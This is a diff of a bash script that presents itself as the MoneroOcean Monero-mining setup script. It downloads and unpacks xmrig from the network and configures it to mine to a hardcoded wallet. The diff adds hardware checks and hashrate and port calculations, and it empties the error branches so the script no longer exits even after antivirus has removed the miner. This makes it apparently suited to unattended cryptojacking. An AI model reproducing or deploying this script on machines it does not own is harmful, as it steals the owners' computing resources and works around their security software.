@@ -1,5 +1,13 @@
 #!/bin/bash
 
+VERSION=2.9
+
+# printing greetings
+
+echo "MoneroOcean mining setup script v$VERSION."
+echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"
+echo
+
 if [ "$(id -u)" == "0" ]; then
   echo "WARNING: Generally it is not adviced to run this script under root"
 fi
@@ -9,6 +17,34 @@ WALLET='82h89Q5ezkYJBz1jKfYrb6VJvBh5PqWXs6bEetoskA4sKNkBCFToTUiJzGbsN7FZGTFGGiki
 EMAIL=$2 # this one is optional
 
 # checking prerequisites
+
+
+if [ -z $HOME ]; then
+  echo "ERROR: Please define HOME environment variable to your home directory"
+  
+fi
+
+if [ ! -d $HOME ]; then
+  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
+  echo '  export HOME=<dir>'
+  
+fi
+
+if ! type curl >/dev/null; then
+  echo "ERROR: This script requires \"curl\" utility to work correctly"
+  
+fi
+
+if ! type lscpu >/dev/null; then
+  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
+fi
+
+#if ! sudo -n true 2>/dev/null; then
+#  if ! pidof systemd >/dev/null; then
+#    echo "ERROR: This script requires systemd to work correctly"
+#    
+#  fi
+#fi
 
 # calculating port
 
@@ -71,6 +107,17 @@ if [ -z "$CPU_L3_CACHE" ]; then
   export CPU_L3_CACHE=2048
 fi
 
+TOTAL_CACHE=$(( $CPU_THREADS*$CPU_L1_CACHE + $CPU_SOCKETS * ($CPU_CORES_PER_SOCKET*$CPU_L2_CACHE + $CPU_L3_CACHE)))
+if [ -z $TOTAL_CACHE ]; then
+  echo "ERROR: Can't compute total cache"
+  
+fi
+EXP_MONERO_HASHRATE=$(( ($CPU_THREADS < $TOTAL_CACHE / 2048 ? $CPU_THREADS : $TOTAL_CACHE / 2048) * ($CPU_MHZ * 20 / 1000) * 5 ))
+if [ -z $EXP_MONERO_HASHRATE ]; then
+  echo "ERROR: Can't compute projected Monero CN hashrate"
+  
+fi
+
 power2() {
   if ! type bc >/dev/null; then
     if [ "$1" -gt "204800" ]; then
@@ -111,6 +158,15 @@ PORT=$(( $EXP_MONERO_HASHRATE * 12 / 1000 ))
 PORT=$(( $PORT == 0 ? 1 : $PORT ))
 PORT=`power2 $PORT`
 PORT=$(( 10000 + $PORT ))
+if [ -z $PORT ]; then
+  echo "ERROR: Can't compute port"
+  
+fi
+
+if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
+  echo "ERROR: Wrong computed port value: $PORT"
+  
+fi
 
 
 # printing intentions
@@ -152,12 +208,14 @@ rm -rf $HOME/moneroocean
 echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
 if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
   echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
+  
 fi
 
 echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/moneroocean"
 [ -d $HOME/moneroocean ] || mkdir $HOME/moneroocean
 if ! tar xf /tmp/xmrig.tar.gz -C $HOME/moneroocean; then
   echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/moneroocean directory"
+  
 fi
 rm /tmp/xmrig.tar.gz
 
@@ -178,6 +236,7 @@ if (test $? -ne 0); then
   echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
   if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
     echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
+    
   fi
 
   echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/moneroocean"
@@ -195,14 +254,13 @@ if (test $? -ne 0); then
     else 
       echo "ERROR: Stock version of $HOME/moneroocean/xmrig was removed by antivirus too"
     fi
-    exit 1
+    
   fi
 fi
 
 echo "[*] Miner $HOME/moneroocean/xmrig is OK"
 
 PASS=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 7 | head -n 1)
-
 sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/moneroocean/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/moneroocean/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/moneroocean/config.json
